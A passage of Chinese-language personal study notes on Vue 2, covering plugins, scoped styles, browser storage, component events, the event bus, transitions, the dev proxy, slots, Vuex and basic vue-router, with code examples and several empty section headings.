	el:'app',
	render: h => h(App)
})
```

```javascript
//通过插件统一给vue添加全局的功能
export default {//向外暴露的完整写法: export default use; const use = {}
  install(Vue,x,y,z){//传入的vue就是vm实例的构造函数
    console.log(x,y,z)
    //全局过滤器
    Vue.filter('mySlice',function(value){
      return value.slice(0,4)
    })
    //定义全局指令
    Vue.directive('fbind',{
      //指令与元素成功绑定时（一上来）
      bind(element,binding){
        element.value = binding.value
      },
      //指令所在元素被插入页面时
      inserted(element,binding){
        element.focus()
      },
      //指令所在的模板被重新解析时
      update(element,binding){
        element.value = binding.value
      }
    })
    //定义全局混入
    Vue.mixin({
      data() {
        return {
          x:100,
          y:200
        }
      },
    })
    //给Vue原型上添加一个方法（vm和vc就都能用了）
    Vue.prototype.hello = ()=>{alert('你好啊')}
  }
}
```

# scoped样式

脚手架扫描`vue`文件时的工作流程:1.先引入,2.读取`vue.extends`中的配置项,3.最后再解析模板

1. 作用：让样式在局部生效，防止冲突
2. 写法：`<style scoped>`
3. 如果`App.vue`中的`style`标签使用`scoped`样式,那么只有`App.vue`中的模板才能激活这些样式,而其它的例如`School.vue`,和`Student.vue`中的标签即使符合需求也不会被应用

```vue
<!-- App.vue -->
<template>
	<div>
		<h1 class="title">你好啊</h1>
		<School/>
		<Student/>
	</div>
</template>
<script>
	import Student from './components/Student'
	import School from './components/School'

	export default {
		name:'App',
		components:{School,Student}
	}
</script>
<style lang="css" scoped>/* style中使用lang样式可以指定style的语法为less或者其它,如果为less的话需要安装less-loader插件 */
	.title{
		color: red;
	}
</style>
```

# Todolist案例1

# Todolist案例2

# Todolist案例3

# Todolist案例4

# Todolist案例5

# Todolist案例6

# Todolist案例7

# Todolist案例总结

1. 组件化编码流程：
  1. 拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。
  2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

    - 一个组件在用：放在组件自身即可。
    - 一些组件在用：放在他们共同的父组件上（状态提升）。
  3. 实现交互：从绑定事件开始。
2. props适用于：
  1. 父组件 ==> 子组件 通信
  2. 子组件 ==> 父组件 通信（要求父先给子一个函数）
3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！
4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。

# 浏览器存储

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）
2. 浏览器端通过Window.sessionStorage和Window.localStorage属性来实现本地存储机制。
3. 相关API：
   1. xxxxxStorage.setItem('key', 'value'):接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。
   2. xxxxxStorage.getItem('key'):接受一个键名作为参数，返回键名对应的值。
   3. xxxxxStorage.removeItem('key'):接受一个键名作为参数，并把该键名从存储中删除。
   4. xxxxxStorage.clear():清空存储中的所有数据。
4. 备注：
   1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
   2. LocalStorage存储的内容，需要手动清除才会消失。
   3. xxxxxStorage.getItem(xxx)如果xxx对应的value获取不到，那么getItem的返回值是null。
   4. JSON.parse(null)的结果依然是null。

```html
<body>
  <h2>localStorage</h2>
  <button onclick="saveData()">点我保存一个数据</button>
  <button onclick="readData()">点我读取一个数据</button>
  <button onclick="deleteData()">点我删除一个数据</button>
  <button onclick="deleteAllData()">点我清空一个数据</button>
  <script type='text/javascript'>
    Vue.config.productionTip = false //阻止vue在启动时生成生产提示
    let p = { name: '张三', age: 18 }
    //将所有的local字节换成session就是会话数据
    function saveData() {
      localStorage.setItem('msg', 'hello!!!')
      localStorage.setItem('msg2', 666)
      localStorage.setItem('person', JSON.stringify(p))
    }
    function readData() {
      console.log(localStorage.getItem('msg'))
      console.log(localStorage.getItem('msg2'))

      const result = localStorage.getItem('person')
      console.log(JSON.parse(result))
      // console.log(localStorage.getItem('msg3')) 
    }
    function deleteData() {
      localStorage.removeItem('msg2')
    }
    function deleteAllData() {
      localStorage.clear()
    }
  </script>
</body>
```

# Todolist案例_本地存储

# 组件自定义事件1

# 组件自定义事件2

# 组件自定义事件总结

1. 一种组件间通信的方式，适用于：子组件向父组件传递数据
2. 使用场景：A是父组件，B是子组件，B给A传数据就要在A中给B绑定自定义事件(事件的回调在A中)
3. 绑定自定义事件：组件标签就是vc实例对象,父组件通过给子组件绑定自定义事件,又通过`this.$emit`触发

   1. 在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```
   2. 在父组件中:`mounted(){this.$refs.xxx.$on('atguigu',this.test)}`
   3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。
4. 触发自定义事件：```this.$emit('atguigu',数据)```		
5. 解绑自定义事件```this.$off('atguigu')```
6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符
7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调，要么配置在methods中要么用箭头函数，否则this指向会出问题！

```vue
<!-- 父组件 -->
<template>
	<div class="app">
		<h1>{{msg}}，学生姓名是:{{studentName}}</h1>
		<!-- 由父组件给子组件传递函数类型的props实现：子给父传递数据 -->
		<School :getSchoolName="getSchoolName"/>

		<!-- 由父组件给子组件绑定一个或多个自定义事件实现：子给父传递数据（第一种写法，使用@或v-on） -->
		<!-- <Student @atguigu="getStudentName" @demo="m1"/> -->

		<!-- 由父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） -->
		<Student ref="student" @click.native="show"/><!-- .native:表示这个事件是原生事件,否则即使子组件一直被点击,这个事件也不会被调用,因为它已经被识别成了自定义事件 -->
	</div>
</template>
<script>
	import Student from './components/Student'
	import School from './components/School'
	export default {
		name:'App',
		components:{School,Student},
		data() {
			return {
				msg:'你好啊！',
				studentName:''
			}
		},
		methods: {
			getSchoolName(name){
				console.log('App收到了学校名：',name)
			},
			getStudentName(name,...params){//ES6语法:...
				console.log('App收到了学生名：',name,params)
				this.studentName = name
			},
			m1(){
				console.log('demo事件被触发了！')
			},
			show(){
				alert(123)
			}
		},
		mounted() {
			this.$refs.student.$on('atguigu',this.getStudentName) //给子组件绑定自定义事件
			/* this.$refs.student.$on('atguigu',function(name){ //除非将函数写为箭头函数否则this指向会出错
				console.log("app收到了学生名");
				this.studentName = name
			})  */
			// this.$refs.student.$once('atguigu',this.getStudentName) //给子组件绑定自定义事件（一次性）
		},
	}
</script>
```

```vue
<!-- School子组件-->
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="sendSchoolName">把学校名给App</button>
	</div>
</template>
<script>
	export default {
		name:'School',
		props:['getSchoolName'],
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
		methods: {
			sendSchoolName(){
				this.getSchoolName(this.name)
			}
		},
	}
</script>
```

```vue
<!-- Student子组件-->
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<h2>当前求和为：{{number}}</h2>
		<button @click="add">点我number++</button>
		<button @click="sendStudentlName">把学生名给App</button>
		<button @click="unbind">解绑atguigu事件</button>
		<button @click="death">销毁当前Student组件的实例(vc)</button>
	</div>
</template>
<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
				number:0
			}
		},
		methods: {
			add(){
				console.log('add回调被调用了')
				this.number++
			},
			sendStudentlName(){
				//触发Student组件实例身上的atguigu事件
				this.$emit('atguigu',this.name,666,888,900)//可以传入多个参数
				// this.$emit('demo')
				// this.$emit('click')
			},
			unbind(){
				this.$off('atguigu') //解绑一个自定义事件
				// this.$off(['atguigu','demo']) //解绑多个自定义事件
				// this.$off() //解绑所有的自定义事件
			},
			death(){
				this.$destroy() //销毁了当前Student组件的实例,销毁后所有Student实例的自定义事件全都不奏效 
			}
		},
	}
</script>
```

# Todolist案例_自定义事件

# 全局事件总线

# 全局事件总线总结

1. 一种组件间通信的方式，适用于任意组件间通信

2. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身

   2. 提供数据：B组件触发自定义事件```this.$bus.$emit('xxxx',数据)```

3. 最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'app',
	render: h => h(App),
	beforeCreate() {
		Vue.prototype.$bus = this //安装全局事件总线:一般起名为$bus
	},
})
```

````vue
<!-- A组件 -->
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>
<script>
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		}, 
		mounted() {
			//console.log('School',this)
			this.$bus.$on('hello',(data)=>{//$bus绑定自定义事件后:要在数据所在组件用$emit触发回调
				console.log('我是School组件，收到了数据',data)
			})
      
      // 子组件触发
      this.$bus.$emit("hello")// 触发hellos
		},
		beforeDestroy() {
			this.$bus.$off('hello')
		},
	}
</script>
````

# Todolist案例_全局事件总线

# pubsub订阅与发布

# pubsub订阅与发布总结

1. 一种组件间通信的方式，适用于任意组件间通信
2. 使用步骤：

   1. 安装pubsub：```npm i pubsub-js```
2. 引入: ```import pubsub from 'pubsub-js'```
   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身

   4. 提供数据：```pubsub.publish('xxx',数据)```
5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去取消订阅

```vue
<!-- 组件A:订阅获得数据 -->
<script>
  //在组件中mounted挂载生命周期发布消息订阅
  mounted() {
    this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
  }
</script>
```

```vue
<!-- 组件B:发布提供数据 -->
<template>
	<div class="student">
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<button @click="sendStudentName">把学生名给School组件</button>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男',
			}
		},
		mounted() {
			// console.log('Student',this.x)
		},
		methods: {
			sendStudentName(){
				// this.$bus.$emit('hello',this.name)
				pubsub.publish('hello',666)//发布消息
			}
		},
	}
</script>
```

# Todolist案例_编辑

# $nextTick

1. 语法：```this.$nextTick(callback)```
2. 作用：在下一次DOM更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行

# 动画效果

```vue
<template>
<div>
  <button @click="isShow = !isShow">显示/隐藏</button>
  <transition name="hello" appear>
    <h1 v-show="isShow">你好啊！</h1>
  </transition>
  </div>
</template>
<script>
  export default {
    name:'Test',
    data() {
      return {
        isShow:true
      }
    },
  }
</script>
<style scoped>
  h1{
    background-color: orange;
  }
  .hello-enter-active{
    animation: atguigu 0.5s linear;
  }
  .hello-leave-active{
    animation: atguigu 0.5s linear reverse;
  }
  @keyframes atguigu {
    from{
      transform: translateX(-100%);
    }
    to{
      transform: translateX(0px);
    }
  }
</style>
```

# 过渡效果_多个元素过渡1

# 过渡效果_多个元素过渡2

```vue
<template>
<div>
  <button @click="isShow = !isShow">显示/隐藏</button>
  <transition-group name="hello" appear><!-- 当transition标签中包裹多个标签时,需要改为用transition-group,并且要给每个标签添加一个key值 -->
    <h1 v-show="!isShow" key="1">你好啊！</h1>
    <h1 v-show="isShow" key="2">尚硅谷！</h1>
  </transition-group>
  </div>
</template>
<script>
  export default {
    name:'Test',
    data() {
      return {
        isShow:true
      }
    },
  }
</script>
<style scoped>
  /* 
  .hello.enter和.hello.leave这两个类被添加一瞬间后消失了,因为只要直到是从哪来的之后就没有用了
  */
  h1{
    background-color: orange;
    /* transition:0.5s linear */
  }
  /* 进入的起点、离开的终点 */
  .hello-enter,.hello-leave-to{/* 相同的样式的类可以这样合并写减少代码量 */
    transform: translateX(-100%);
  }
  .hello-enter-active,.hello-leave-active{
    transition: 0.5s linear;
  }
  /* 进入的终点、离开的起点 */
  .hello-enter-to,.hello-leave{
    transform: translateX(0);
  }
</style>
```

# 集成第三方动画

```vue
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
		<transition-group 
			appear
			name="animate__animated animate__bounce" 
			enter-active-class="animate__swing"
			leave-active-class="animate__backOutUp"
		>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">尚硅谷！</h1>
		</transition-group>
	</div>
</template>

<script>
	import 'animate.css' //引入外部css文件
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>
<style scoped>
	h1{
		background-color: orange;
	}
</style>
```

# 总结过渡与动画

1. 作用：在插入、更新或移除DOM元素时，在合适的时候给元素添加样式类名

2. 写法：

   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用```<transition>```包裹要过度的元素，并配置name属性：

   3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。

# 配置代理方式1

配置代理是对跨域请求问题的解决方式

在vue.config.js中添加如下配置：`devServer:{ proxy:"http://localhost:5000" }`

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

```vue
<template>
	<div>
		<button @click="getStudents">获取学生信息</button>
		<button @click="getCars">获取汽车信息</button>
	</div>
</template>
<script>
	import axios from 'axios'
	export default {
		name:'App',
		methods: {
			getStudents(){
				axios.get('http://localhost:8080/students').then(//缺点:向代理服务器请求数据,如果代理服务器上存在同名文件则直接返回,不存在则向5000端口号索取
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			},
			getCars(){
				axios.get('http://localhost:8080/demo/cars').then(
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			}
		},
	}
</script>

```

# 配置代理方式2

编写vue.config.js配置具体代理规则：

```js
module.exports = {
  devServer: {
    proxy: {
      //http://localhost:8080/api1/demo/cars;demo/cars为要请求demos路径下的cars文件
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}//将`url/api2/students`正则匹配改为`url/students`
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。

# github案例1

# github案例2

# github案例3

# vue-resource

1. vue.resource:是一个插件,在main.js中引用,通过vue.use()在全局注册
2. 使用方法:和axios一样,只需要将axios替换为$http
3. 备注:vue-resource已经不在维护,推荐使用axios

# 默认插槽

插槽:让父组件可以向子组件指定位置插入指定的html结构,也是一种组件间通信的方式

```vue
<!-- 父组件APP -->
<template>
<div class="container">
  <Category title="美食" ><!-- 创建子组件实例,并在组件标签中添加标签 -->
    <img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
  </Category>

  <Category title="游戏" >
    <ul>
      <li v-for="(g,index) in games" :key="index">{{g}}</li>
  </ul>
  </Category>

  <Category title="电影">
    <video controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
  </Category>
  </div>
</template>
```

```vue
<!-- 子组件Category -->
<template>
	<div class="category">
		<h3>{{title}}分类</h3>
		<!-- 定义一个插槽:展示父组件App[5]的内容 -->
		<slot>我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
	</div>
</template>
```

# 具名插槽

```vue
<!-- 父组件APP -->
<template>
	<div class="container">
		<Category title="美食" >
			<img slot="center" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
			<a slot="footer" href="http://www.atguigu.com">更多美食</a>
		</Category>
</template>
```

```vue
<!-- 子组件Category -->
<template>
	<div class="category">
		<h3>{{title}}分类</h3>
		<slot name="center">我是一些默认值，当使用者没有传递具体结构时，我会出现1</slot>
		<slot name="footer">我是一些默认值，当使用者没有传递具体结构时，我会出现2</slot>
	</div>
</template>
```

# 作用域插槽

数据在子组件，但根据数据生成的结构需要父组件来决定,（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

```vue
![105.Vuex简介2](D:\OneDrive\Vue\1\105.Vuex简介2.png)<!-- 父组件APP -->
<template>
	<div class="container">
		<Category title="游戏">
      <!-- 必须用template标签包裹 -->
			<template slot-scope="{games}"><!-- 旧API:scope="{games}" -->
        <!-- [6]中{games}为解构赋值写法,非解构赋值:slot-scope="game";[8]改为game.games -->
				<h4 v-for="(g,index) in games" :key="index">{{g}}</h4>
			</template>
		</Category>
	</div>
</template>
```

```vue
<!-- 子组件Category -->
<template>
	<div class="category">
		<h3>{{title}}分类</h3>
		<slot :games="games" msg="hello">我是默认的一些内容</slot>
	</div>
</template>
<script>
	export default {
		name:'Category',
		props:['title'],
		data() {
			return {
				games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
			}
		},
	}
</script>
```

# Vuex简介

什么时候使用Vuex?

1.多个组件依赖于同一状态

2.来自不同组件的行为需要变更同一状态

![](D:\OneDrive\Vue\1\105.Vuex简介1.png)

![]()![105.Vuex简介2](D:\OneDrive\Vue\1\105.Vuex简介2.png)

# 求和案例_Vue

```vue
<template>
	<div>
		<h1>当前求和为：{{sum}}</h1>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
	export default {
		name:'Count',
		data() {
			return {
				n:1, //用户选择的数字
				sum:0 //当前的和
			}
		},
		methods: {
			increment(){
				this.sum += this.n
			},
			decrement(){
				this.sum -= this.n
			},
			incrementOdd(){
				if(this.sum % 2){
					this.sum += this.n
				}
			},
			incrementWait(){
				setTimeout(()=>{
					this.sum += this.n
				},500)
			},
		},
	}
</script>
```

# Vuex工作原理

Actions;Mutations;State三者都是Obj对象,且诸多API也属于Store管理

工作流程:

1. Vuecomponents调用Store的API_dispatch将组件想要进行的行为(Actions)和想要改变的状态(State)发送给Actions
2. 如果是能执行的简单行为和已知的数据则可以跳过Actions通过API_Commit向Mutatios直接交流,否则就需要通过Actions向后端服务器(Backend API)请求方法或数据
3. Mutations收到行为和数据后直接修改State中的状态

![](D:\OneDrive\Vue\1\107.Vuex工作原理图.png)

# 搭建Vuex工作环境

搭建流程:

1. npm i Vuex
2. vue.ues(Vuex)
3. 创建store
4. 让所有vc获取store 

```javascript
//于脚手架:maaya/src/store路径下创建index.js文件
//引入Vue核心库
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件:由于在main.js中应用插件,vue会将所有的import引入提前到首先执行的位置,所以导致应用Vuex插件会是始终位于import Store之后而报错
Vue.use(Vuex)

//准备actions对象——响应组件中用户的动作
const actions = {}
//准备mutations对象——修改state中的数据
const mutations = {}
//准备state对象——保存具体的数据
const state = {}

//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state
})
```

```javascript
//此文件路径为:maaya/src/main.js
//引入其它文件,此处省略
//引入store
import store from './store'

//创建vm
new Vue({
	el:'app',
	render: h => h(App),
	store
})
```

# 求和案例_Vuex

```javascript
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)
//准备actions:用于响应组件中的动作
const actions = {
	/* jia(context,value){
		console.log('actions中的jia被调用了')
		context.commit('JIA',value)
	},
	jian(context,value){
		console.log('actions中的jian被调用了')
		context.commit('JIAN',value)
	}, */
	jiaOdd(context,value){
		console.log('actions中的jiaOdd被调用了')
		if(context.state.sum % 2){
			context.commit('JIA',value)
		}
	},
	jiaWait(context,value){
		console.log('actions中的jiaWait被调用了')
		setTimeout(()=>{
			context.commit('JIA',value)
		},500)
	}
}
//准备mutations:用于操作数据（state）
const mutations = {
	JIA(state,value){
		console.log('mutations中的JIA被调用了')
		state.sum += value
	},
	JIAN(state,value){
		console.log('mutations中的JIAN被调用了')
		state.sum -= value
	}
}
//准备state:用于存储数据
const state = {
	sum:0 //当前的和
}
//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
})
```

```vue
<template>
	<div>
		<h1>当前求和为：{{$store.state.sum}}</h1>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>
<script>
	export default {
		name:'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
		methods: {
			increment(){
				this.$store.commit('JIA',this.n)
			},
			decrement(){
				this.$store.commit('JIAN',this.n)
			},
			incrementOdd(){
				this.$store.dispatch('jiaOdd',this.n)
			},
			incrementWait(){
				this.$store.dispatch('jiaWait',this.n)
			},
		},
		mounted() {
			console.log('Count',this)
		},
	}
</script>
```

# Vuex开发者工具的使用

1. 在组件`vc`中也可以使用`$store.diapatch`;`$store.commit`;`$store.state.key`;但是不推荐使用,复杂的业务逻辑放在`Vuex`的`index.js`文件中可以更好的复用解决冗余
2. `Actions中`的`context`(全局上下文对象)的作用:`context`就是`miniStore`3
3. `dispatch`的作用是将复杂的代码逻辑在`Actions`
4. 若没有网络请求或其他业务逻辑,组件中也可以越过`Actions`,即不写```dispatch```,直接编写`commit`

# getter配置项

```javascript
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)
//准备actions——用于响应组件中的动作
const actions = {}
//准备mutations——用于操作数据（state）
const mutations = {}
//准备state——用于存储数据
const state = {
	sum:0
}
//准备getters:用于将state中的数据进行加工,并不会改变state中的原数据
const getters = {
	bigSum(state){
		return state.sum*10
	}
}
//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
	getters
})
```

# mapState和mapGetters

```javascript
//需要从vuex引入mapState方法
import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'
computed: {
  //借助mapState生成计算属性：sum、school、subject（对象写法）
  ...mapState({sum:'sum',school:'school',subject:'subject'}),         
    //借助mapState生成计算属性：sum、school、subject（数组写法）
    ...mapState(['sum','school','subject']),
    //靠程序员自己亲自去写计算属性
    sum(){
    	return this.$store.state.sum
    },
}
```

```javascript
computed: {
    //借助mapGetters生成计算属性：bigSum（对象写法）
    ...mapGetters({bigSum:'bigSum'}),
    //借助mapGetters生成计算属性：bigSum（数组写法）
    ...mapGetters(['bigSum'])
    //靠程序员自己亲自去写计算属性
    bigSum(){
			return this.$store.getters.bigSum
		}
}
```

# mapMutations和mapActions

`mapActions`与`mapMutations`使用时，若需要传递参数,则在模板中绑定事件时传递好参数，否则参数是事件对象

```javascript
methods:{
    //靠mapActions生成：incrementOdd、incrementWait（对象形式）
    ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
    //靠mapActions生成：incrementOdd、incrementWait（数组形式）
    ...mapActions(['jiaOdd','jiaWait'])
  	//程序员亲自写方法
		incrementOdd(){
			this.$store.dispatch('jiaOdd',this.n)
		}
}
```

```javascript
methods:{
    //靠mapActions生成：increment、decrement（对象形式）
    ...mapMutations({increment:'JIA',decrement:'JIAN'}),    
    //靠mapMutations生成：JIA、JIAN（对象形式）
    ...mapMutations(['JIA','JIAN']),
    //程序员亲自写方法
		increment(){
			this.$store.commit('JIA',this.n)
		}
}
```

# 多组件共享实例

```vue
<template>
<div>
  <h1>当前求和为：{{sum}}</h1>
  <h3>当前求和放大10倍为：{{bigSum}}</h3>
  <h3>我在{{school}}，学习{{subject}}</h3>
  <h3 style="color:red">Person组件的总人数是：{{personList.length}}</h3>
  <select v-model.number="n">
    <option value="1">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
  </select>
  <button @click="increment(n)">+</button>
  <button @click="decrement(n)">-</button>
  <button @click="incrementOdd(n)">当前求和为奇数再加</button>
  <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
  import {mapState,mapGetters,mapMutations,mapActions} from 'vuex'
  export default {
    name:'Count',
    data() {
      return {
        n:1, //用户选择的数字
      }
    },
    computed:{
      //借助mapState生成计算属性，从state中读取数据。（数组写法）
      ...mapState(['sum','school','subject','personList']),
      //借助mapGetters生成计算属性，从getters中读取数据。（数组写法）
      ...mapGetters(['bigSum'])
    },
    methods: {
      //借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(对象写法)
      ...mapMutations({increment:'JIA',decrement:'JIAN'}),
      //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
      ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
    },
    mounted() {
      // const x = mapState({he:'sum',xuexiao:'school',xueke:'subject'})
      // console.log(x)
    },
  }
</script>
```

# Vuex模块化+namespace1

Vuex模块化:让代码更好维护,让多种数据分类更加明确

```javascript
//修改store.js
const countAbout = {
  namespaced:true,//命名空间:开启后才能使用解构赋值的方法调用数据和API
  state:{x:1},
  mutations: { ... },
  actions: { ... },
  getters: {
    bigSum(state){
       return state.sum * 10
    }
  }
}
const personAbout = {
  namespaced:true,
  state:{ ... },
  mutations: { ... },
  actions: { ... }
}
const store = new Vuex.Store({
  modules: {
    countAbout,
    personAbout
  }
})
```

组件中读取state数据:

```js
//方式一：自己直接读取
this.$store.state.countAbout.sum
//方式二：借助mapState读取：需要开启命名空间
...mapState('countAbout',['sum','school','subject']),
```

组件中读取getters数据

```javascript
//方式一：自己直接读取
this.$store.getters['personAbout/firstPersonName']
//方式二：借助mapGetters读取：需要开启命名空间
...mapGetters('countAbout',['bigSum'])
```

# Vuex模块化+namespace2

组件中调用dispatch

```javascript
//方式一：自己直接dispatch
this.$store.dispatch('personAbout/addPersonWang',person)
//方式二：借助mapActions：需要开启命名空间
...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
```

组件中调用commit

```javascript
//方式一：自己直接commit
this.$store.commit('personAbout/ADD_PERSON',person)
//方式二：借助mapMutations：需要开启命名空间
...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
```

# 路由的简介

1. 理解：一个路由（route）就是一组映射关系（key-value），多个路由需要路由器（router）进行管理。
2. 前端路由：key是路径，value是组件

# 路由的基本使用

```javascript
//在src/router路径下创建index.js文件来编写router配置项
//引入VueRouter
import VueRouter from 'vue-router'
//引入路由组件
import About from '../components/About'
import Home from '../components/Home'
//创建router实例对象，去管理一组一组的路由规则
const router = new VueRouter({
	routes:[
		{
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home
		}
	]
})

//暴露router
export default router
```

```javascript
//在main.js中引入router
//省略引入其它
//引入VueRouter
import VueRouter from 'vue-router'
//引入router
import router from "./router"
//应用VueRouter插件
Vue.use(VueRouter)
//创建vm实例
new Vue({
  el:"app",
  render h => h(app),
  router
})
```

```vue
<!-- 此代码展示忽略了诸多css样式 -->
<template>
  <div>
  	<h2>Vue Router Demo</h2>
    <div class="row">
    	<!-- 原始html中我们使用a标签实现页面的跳转 -->
    	<!-- <a class="list-group-item active" href="./about.html">About</a> -->
    	<!-- <a class="list-group-item" href="./home.html">Home</a> -->

    	<!-- Vue中借助router-link标签实现路由的切换 -->
    	<router-link active-class="active" to="/about">About</router-link>
      <!-- active-class样式:使改标签现实被激活状态 -->
    	<router-link active-class="active" to="/home">Home</router-link>
    	<!-- 指定组件的呈现位置 -->
    	<router-view></router-view>
  </div>
</template>
<script>
export default {
  name: "App"
};
</script>
```

# 几个注意点

1. 路由组件通常存放在```/pages```文件夹，一般组件通常存放在```components```文件夹,`pages`和`components`处于同一级
2. 通过切换,“隐藏”了的路由组件,默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个`router`，可以通过组件的```$router```属性获取到。

```vue
<template>
	<h2>我是About的内容</h2>
</template>

<script>
	export default {
		name:'About',
    //切换路由组件时:该组件自动被销毁
		beforeDestroy() {
			console.log('About组件即将被销毁了')
		},
    //将about的vc实例对象上的$rote和$router绑定到window的属性上
    //另外一个路由组件也同样进行此操作,再通过`===`判断,发现$route不等,$router相等
		mounted() {
			console.log('About组件挂载完毕了',this)
			window.aboutRoute = this.$route
			window.aboutRouter = this.$router
		}
	}
</script>
```

# 嵌套路由

```javascript
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'

//创建并暴露一个路由器
export default new VueRouter({
	routes:[
		{
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home,
			children:[//子路由
				{
					path:'news',//路径不要添加/,但在router-link标签中的to样式需要添加上父路径:/home/news
					component:News,
				},
				{
					path:'message',
					component:Message,
				}
			]
		}
	]
})

```

```javascript
//跳转要写完整路径
<router-link to="/home/news">News</router-link>
```

# 路由的query参数

```vue
<!-- 跳转并携带query参数，to的字符串写法 -->
